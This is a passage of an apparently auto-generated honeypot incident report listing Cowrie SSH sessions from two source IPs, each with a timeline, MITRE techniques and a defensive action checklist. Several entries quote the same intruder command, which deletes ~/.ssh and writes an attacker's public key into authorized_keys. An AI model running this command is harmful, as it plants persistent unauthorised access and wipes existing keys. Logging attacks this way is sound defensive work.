| Time (UTC) | Event |
|---|---|
| `2026-04-22 17:58:58` | `cowrie.session.connect` |
| `2026-04-22 17:58:58` | `cowrie.client.version` |
| `2026-04-22 17:58:59` | `cowrie.client.kex` |
| `2026-04-22 17:59:00` | `cowrie.login.success` |
| `2026-04-22 17:59:00` | `cowrie.session.params` |
| `2026-04-22 17:59:00` | `cowrie.command.input` |
| `2026-04-22 17:59:00` | `cowrie.command.failed` |
| `2026-04-22 17:59:00` | `cowrie.log.closed` |
| `2026-04-22 17:59:01` | `cowrie.session.params` |
| `2026-04-22 17:59:01` | `cowrie.command.input` |
| `2026-04-22 17:59:01` | `cowrie.session.file_download` |
| `2026-04-22 17:59:01` | `cowrie.log.closed` |
| `2026-04-22 17:59:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `43.130.90[.]166` to AbuseIPDB if not already reported
- [ ] Block `43.130.90[.]166` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b86a5b688de9

| Field | Detail |
|---|---|
| **Source IP** | `43.130.90[.]166` |
| **First Seen** | 2026-04-22 17:59 |
| **Last Seen** | 2026-04-22 17:59 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-22 17:59:04` | `cowrie.session.connect` |
| `2026-04-22 17:59:04` | `cowrie.client.version` |
| `2026-04-22 17:59:05` | `cowrie.client.kex` |
| `2026-04-22 17:59:06` | `cowrie.login.success` |
| `2026-04-22 17:59:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `43.130.90[.]166` to AbuseIPDB if not already reported
- [ ] Block `43.130.90[.]166` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5b869056c21b

| Field | Detail |
|---|---|
| **Source IP** | `43.130.90[.]166` |
| **First Seen** | 2026-04-22 17:59 |
| **Last Seen** | 2026-04-22 17:59 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-22 17:59:42` | `cowrie.session.connect` |
| `2026-04-22 17:59:42` | `cowrie.client.version` |
| `2026-04-22 17:59:42` | `cowrie.client.kex` |
| `2026-04-22 17:59:43` | `cowrie.login.success` |
| `2026-04-22 17:59:43` | `cowrie.session.params` |
| `2026-04-22 17:59:43` | `cowrie.command.input` |
| `2026-04-22 17:59:43` | `cowrie.command.failed` |
| `2026-04-22 17:59:44` | `cowrie.log.closed` |
| `2026-04-22 17:59:44` | `cowrie.session.params` |
| `2026-04-22 17:59:44` | `cowrie.command.input` |
| `2026-04-22 17:59:44` | `cowrie.session.file_download` |
| `2026-04-22 17:59:44` | `cowrie.log.closed` |
| `2026-04-22 17:59:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `43.130.90[.]166` to AbuseIPDB if not already reported
- [ ] Block `43.130.90[.]166` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-882517f6aa22

| Field | Detail |
|---|---|
| **Source IP** | `43.130.90[.]166` |
| **First Seen** | 2026-04-22 17:59 |
| **Last Seen** | 2026-04-22 17:59 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-22 17:59:48` | `cowrie.session.connect` |
| `2026-04-22 17:59:48` | `cowrie.client.version` |
| `2026-04-22 17:59:48` | `cowrie.client.kex` |
| `2026-04-22 17:59:49` | `cowrie.login.success` |
| `2026-04-22 17:59:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `43.130.90[.]166` to AbuseIPDB if not already reported
- [ ] Block `43.130.90[.]166` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-15a4f0fc4d01

| Field | Detail |
|---|---|
| **Source IP** | `43.130.90[.]166` |
| **First Seen** | 2026-04-22 18:01 |
| **Last Seen** | 2026-04-22 18:01 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-22 18:01:34` | `cowrie.session.connect` |
| `2026-04-22 18:01:34` | `cowrie.client.version` |
| `2026-04-22 18:01:34` | `cowrie.client.kex` |
| `2026-04-22 18:01:35` | `cowrie.login.success` |
| `2026-04-22 18:01:36` | `cowrie.session.params` |
| `2026-04-22 18:01:36` | `cowrie.command.input` |
| `2026-04-22 18:01:36` | `cowrie.command.failed` |
| `2026-04-22 18:01:36` | `cowrie.log.closed` |
| `2026-04-22 18:01:37` | `cowrie.session.params` |
| `2026-04-22 18:01:37` | `cowrie.command.input` |
| `2026-04-22 18:01:37` | `cowrie.session.file_download` |
| `2026-04-22 18:01:37` | `cowrie.log.closed` |
| `2026-04-22 18:01:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `43.130.90[.]166` to AbuseIPDB if not already reported
- [ ] Block `43.130.90[.]166` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-81283f6fc34b

| Field | Detail |
|---|---|
| **Source IP** | `43.130.90[.]166` |
| **First Seen** | 2026-04-22 18:01 |
| **Last Seen** | 2026-04-22 18:01 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-22 18:01:40` | `cowrie.session.connect` |
| `2026-04-22 18:01:40` | `cowrie.client.version` |
| `2026-04-22 18:01:40` | `cowrie.client.kex` |
| `2026-04-22 18:01:41` | `cowrie.login.success` |
| `2026-04-22 18:01:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `43.130.90[.]166` to AbuseIPDB if not already reported
- [ ] Block `43.130.90[.]166` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8ff6d448d3dc

| Field | Detail |
|---|---|
| **Source IP** | `43.130.90[.]166` |
| **First Seen** | 2026-04-22 18:02 |
| **Last Seen** | 2026-04-22 18:02 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-22 18:02:49` | `cowrie.session.connect` |
| `2026-04-22 18:02:49` | `cowrie.client.version` |
| `2026-04-22 18:02:49` | `cowrie.client.kex` |
| `2026-04-22 18:02:50` | `cowrie.login.success` |
| `2026-04-22 18:02:50` | `cowrie.session.params` |
| `2026-04-22 18:02:50` | `cowrie.command.input` |
| `2026-04-22 18:02:50` | `cowrie.command.failed` |
| `2026-04-22 18:02:51` | `cowrie.log.closed` |
| `2026-04-22 18:02:51` | `cowrie.session.params` |
| `2026-04-22 18:02:51` | `cowrie.command.input` |
| `2026-04-22 18:02:52` | `cowrie.session.file_download` |
| `2026-04-22 18:02:52` | `cowrie.log.closed` |
| `2026-04-22 18:02:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `43.130.90[.]166` to AbuseIPDB if not already reported
- [ ] Block `43.130.90[.]166` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-05abed47e9c5

| Field | Detail |
|---|---|
| **Source IP** | `43.130.90[.]166` |
| **First Seen** | 2026-04-22 18:02 |
| **Last Seen** | 2026-04-22 18:02 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-22 18:02:55` | `cowrie.session.connect` |
| `2026-04-22 18:02:55` | `cowrie.client.version` |
| `2026-04-22 18:02:55` | `cowrie.client.kex` |
| `2026-04-22 18:02:56` | `cowrie.login.success` |
| `2026-04-22 18:02:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `43.130.90[.]166` to AbuseIPDB if not already reported
- [ ] Block `43.130.90[.]166` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-94ac9d382fcd

| Field | Detail |
|---|---|
| **Source IP** | `190.129.122[.]185` |
| **First Seen** | 2026-04-22 18:04 |
| **Last Seen** | 2026-04-22 18:05 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-22 18:04:51` | `cowrie.session.connect` |
| `2026-04-22 18:04:51` | `cowrie.client.version` |
| `2026-04-22 18:04:51` | `cowrie.client.kex` |
| `2026-04-22 18:04:53` | `cowrie.login.success` |
| `2026-04-22 18:04:54` | `cowrie.session.params` |
| `2026-04-22 18:04:54` | `cowrie.command.input` |
| `2026-04-22 18:04:54` | `cowrie.command.failed` |
| `2026-04-22 18:04:54` | `cowrie.log.closed` |
| `2026-04-22 18:04:55` | `cowrie.session.params` |
| `2026-04-22 18:04:55` | `cowrie.command.input` |
| `2026-04-22 18:04:55` | `cowrie.session.file_download` |
| `2026-04-22 18:04:55` | `cowrie.log.closed` |
| `2026-04-22 18:05:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `190.129.122[.]185` to AbuseIPDB if not already reported
- [ ] Block `190.129.122[.]185` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-308315efe15b

| Field | Detail |
|---|---|
| **Source IP** | `190.129.122[.]185` |
| **First Seen** | 2026-04-22 18:04 |
| **Last Seen** | 2026-04-22 18:05 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-22 18:04:59` | `cowrie.session.connect` |
| `2026-04-22 18:04:59` | `cowrie.client.version` |
| `2026-04-22 18:05:00` | `cowrie.client.kex` |
| `2026-04-22 18:05:01` | `cowrie.login.success` |
| `2026-04-22 18:05:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `190.129.122[.]185` to AbuseIPDB if not already reported
- [ ] Block `190.129.122[.]185` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f37284414257

| Field | Detail |
|---|---|
| **Source IP** | `190.129.122[.]185` |
| **First Seen** | 2026-04-22 18:06 |
| **Last Seen** | 2026-04-22 18:06 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-22 18:06:45` | `cowrie.session.connect` |
| `2026-04-22 18:06:45` | `cowrie.client.version` |
| `2026-04-22 18:06:45` | `cowrie.client.kex` |
| `2026-04-22 18:06:47` | `cowrie.login.success` |
| `2026-04-22 18:06:48` | `cowrie.session.params` |
| `2026-04-22 18:06:48` | `cowrie.command.input` |
| `2026-04-22 18:06:48` | `cowrie.command.failed` |
| `2026-04-22 18:06:48` | `cowrie.log.closed` |
| `2026-04-22 18:06:49` | `cowrie.session.params` |
| `2026-04-22 18:06:49` | `cowrie.command.input` |
| `2026-04-22 18:06:49` | `cowrie.session.file_download` |
| `2026-04-22 18:06:49` | `cowrie.log.closed` |
| `2026-04-22 18:06:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `190.129.122[.]185` to AbuseIPDB if not already reported
- [ ] Block `190.129.122[.]185` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2c2bb6a35e01

| Field | Detail |
|---|---|
| **Source IP** | `190.129.122[.]185` |
| **First Seen** | 2026-04-22 18:06 |
| **Last Seen** | 2026-04-22 18:06 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-22 18:06:53` | `cowrie.session.connect` |
| `2026-04-22 18:06:53` | `cowrie.client.version` |
| `2026-04-22 18:06:54` | `cowrie.client.kex` |
| `2026-04-22 18:06:55` | `cowrie.login.success` |
| `2026-04-22 18:06:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `190.129.122[.]185` to AbuseIPDB if not already reported
- [ ] Block `190.129.122[.]185` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9dc4c9b95321

| Field | Detail |
|---|---|
| **Source IP** | `190.129.122[.]185` |
| **First Seen** | 2026-04-22 18:07 |
| **Last Seen** | 2026-04-22 18:07 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-22 18:07:43` | `cowrie.session.connect` |
| `2026-04-22 18:07:43` | `cowrie.client.version` |
| `2026-04-22 18:07:43` | `cowrie.client.kex` |
| `2026-04-22 18:07:45` | `cowrie.login.success` |
| `2026-04-22 18:07:46` | `cowrie.session.params` |
| `2026-04-22 18:07:46` | `cowrie.command.input` |
| `2026-04-22 18:07:46` | `cowrie.command.failed` |
| `2026-04-22 18:07:46` | `cowrie.log.closed` |
| `2026-04-22 18:07:47` | `cowrie.session.params` |
| `2026-04-22 18:07:47` | `cowrie.command.input` |
| `2026-04-22 18:07:47` | `cowrie.session.file_download` |
| `2026-04-22 18:07:47` | `cowrie.log.closed` |
| `2026-04-22 18:07:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `190.129.122[.]185` to AbuseIPDB if not already reported
- [ ] Block `190.129.122[.]185` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-238e4b1bd1b5

| Field | Detail |
|---|---|
| **Source IP** | `190.129.122[.]185` |
| **First Seen** | 2026-04-22 18:07 |
| **Last Seen** | 2026-04-22 18:07 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-22 18:07:51` | `cowrie.session.connect` |
| `2026-04-22 18:07:51` | `cowrie.client.version` |
| `2026-04-22 18:07:52` | `cowrie.client.kex` |
| `2026-04-22 18:07:53` | `cowrie.login.success` |
| `2026-04-22 18:07:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `190.129.122[.]185` to AbuseIPDB if not already reported
- [ ] Block `190.129.122[.]185` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-eb6043bb7532

| Field | Detail |
|---|---|
| **Source IP** | `190.129.122[.]185` |
| **First Seen** | 2026-04-22 18:09 |
| **Last Seen** | 2026-04-22 18:09 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-22 18:09:40` | `cowrie.session.connect` |
| `2026-04-22 18:09:40` | `cowrie.client.version` |
| `2026-04-22 18:09:41` | `cowrie.client.kex` |
| `2026-04-22 18:09:42` | `cowrie.login.success` |
| `2026-04-22 18:09:43` | `cowrie.session.params` |
| `2026-04-22 18:09:43` | `cowrie.command.input` |
| `2026-04-22 18:09:43` | `cowrie.command.failed` |
| `2026-04-22 18:09:44` | `cowrie.log.closed` |
| `2026-04-22 18:09:44` | `cowrie.session.params` |
| `2026-04-22 18:09:44` | `cowrie.command.input` |
| `2026-04-22 18:09:45` | `cowrie.session.file_download` |
| `2026-04-22 18:09:45` | `cowrie.log.closed` |
| `2026-04-22 18:09:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `190.129.122[.]185` to AbuseIPDB if not already reported
- [ ] Block `190.129.122[.]185` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6a5210addd95

| Field | Detail |
|---|---|
| **Source IP** | `190.129.122[.]185` |
| **First Seen** | 2026-04-22 18:09 |
| **Last Seen** | 2026-04-22 18:09 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-22 18:09:49` | `cowrie.session.connect` |
| `2026-04-22 18:09:49` | `cowrie.client.version` |
| `2026-04-22 18:09:49` | `cowrie.client.kex` |
| `2026-04-22 18:09:51` | `cowrie.login.success` |
| `2026-04-22 18:09:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `190.129.122[.]185` to AbuseIPDB if not already reported
- [ ] Block `190.129.122[.]185` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-08eb40f86682

| Field | Detail |
|---|---|
| **Source IP** | `190.129.122[.]185` |
| **First Seen** | 2026-04-22 18:10 |
| **Last Seen** | 2026-04-22 18:10 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-22 18:10:39` | `cowrie.session.connect` |
| `2026-04-22 18:10:39` | `cowrie.client.version` |
| `2026-04-22 18:10:40` | `cowrie.client.kex` |
| `2026-04-22 18:10:41` | `cowrie.login.success` |
| `2026-04-22 18:10:42` | `cowrie.session.params` |
| `2026-04-22 18:10:42` | `cowrie.command.input` |
| `2026-04-22 18:10:42` | `cowrie.command.failed` |
| `2026-04-22 18:10:42` | `cowrie.log.closed` |
| `2026-04-22 18:10:43` | `cowrie.session.params` |
| `2026-04-22 18:10:43` | `cowrie.command.input` |
| `2026-04-22 18:10:44` | `cowrie.session.file_download` |
| `2026-04-22 18:10:44` | `cowrie.log.closed` |
| `2026-04-22 18:10:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `190.129.122[.]185` to AbuseIPDB if not already reported
- [ ] Block `190.129.122[.]185` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-74bace97b2ea

| Field | Detail |
|---|---|
| **Source IP** | `190.129.122[.]185` |
| **First Seen** | 2026-04-22 18:10 |
| **Last Seen** | 2026-04-22 18:10 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-22 18:10:48` | `cowrie.session.connect` |
| `2026-04-22 18:10:48` | `cowrie.client.version` |
| `2026-04-22 18:10:48` | `cowrie.client.kex` |
